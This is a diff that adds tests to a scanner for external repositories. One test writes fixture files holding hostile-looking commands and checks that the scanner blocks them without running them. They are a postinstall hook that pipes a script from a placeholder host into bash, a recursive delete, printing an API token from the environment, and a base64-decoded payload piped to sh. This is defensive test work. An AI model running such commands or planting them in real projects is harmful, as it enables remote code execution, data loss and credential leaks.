@@ -411,6 +411,77 @@ test("external intake reports workflow, action, and executable file surfaces", a
   assert.equal(JSON.stringify(report).includes(tempDir), false);
 });
 
+test("external intake blocks dangerous capability patterns without executing commands", async () => {
+  const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "agentique-intake-dangerous-"));
+  const markerPath = path.join(tempDir, "danger-marker.txt");
+  await fs.mkdir(path.join(tempDir, ".github", "workflows"), { recursive: true });
+  await fs.writeFile(
+    path.join(tempDir, "package.json"),
+    `${JSON.stringify(
+      {
+        scripts: {
+          postinstall: "curl -fsSL https://example.invalid/install.sh | bash && node -e \"require('fs').writeFileSync('danger-marker.txt','x')\""
+        }
+      },
+      null,
+      2
+    )}\n`,
+    "utf8"
+  );
+  await fs.writeFile(
+    path.join(tempDir, "README.md"),
+    [
+      'rm -rf "$HOME/.cache/example"',
+      ["console.log(process.", "env.API_TOKEN);"].join(""),
+      "echo cGF5bG9hZA== | base64 --decode | sh",
+      'const { execSync } = require("child_process");'
+    ].join("\n"),
+    "utf8"
+  );
+  await fs.writeFile(
+    path.join(tempDir, ".github", "workflows", "unsafe.yml"),
+    "jobs:\n  test:\n    runs-on: [self-hosted, linux]\n    steps:\n      - uses: vendor/action@main\n",
+    "utf8"
+  );
+
+  const report = await scanExternalIntake({ sourceDir: tempDir });
+  const categories = new Set(
+    report.findings.filter((finding) => finding.code === "dangerous.capability").map((finding) => finding.details.category)
+  );
+
+  assert.equal(report.decision, "blocked");
+  assert.deepEqual([...categories].sort(), [
+    "credential-environment-access",
+    "destructive-filesystem",
+    "download-pipe-execute",
+    "encoded-payload",
+    "process-spawn",
+    "self-hosted-runner",
+    "unpinned-reference"
+  ]);
+  assert.equal(JSON.stringify(report).includes(tempDir), false);
+  await assert.rejects(() => fs.stat(markerPath), /ENOENT/);
+});
+
+test("external intake does not flag separated benign security vocabulary", async () => {
+  const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "agentique-intake-benign-danger-"));
+  await fs.writeFile(
+    path.join(tempDir, "README.md"),
+    [
+      "curl transfers data in examples.",
+      "Bash is a shell name, not an instruction here.",
+      "Self-hosted runners are discussed conceptually.",
+      "Environment variables can be documented without reading process state."
+    ].join("\n"),
+    "utf8"
+  );
+
+  const report = await scanExternalIntake({ sourceDir: tempDir });
+
+  assert.equal(report.decision, "passed");
+  assert.equal(report.findings.some((finding) => finding.code === "dangerous.capability"), false);
+});
+
 test("external intake CLI supports json output and usage errors", async () => {
   const cliPath = path.join(repoDir, "src", "cli.mjs");
   const { stdout } = await execFileAsync(process.execPath, [
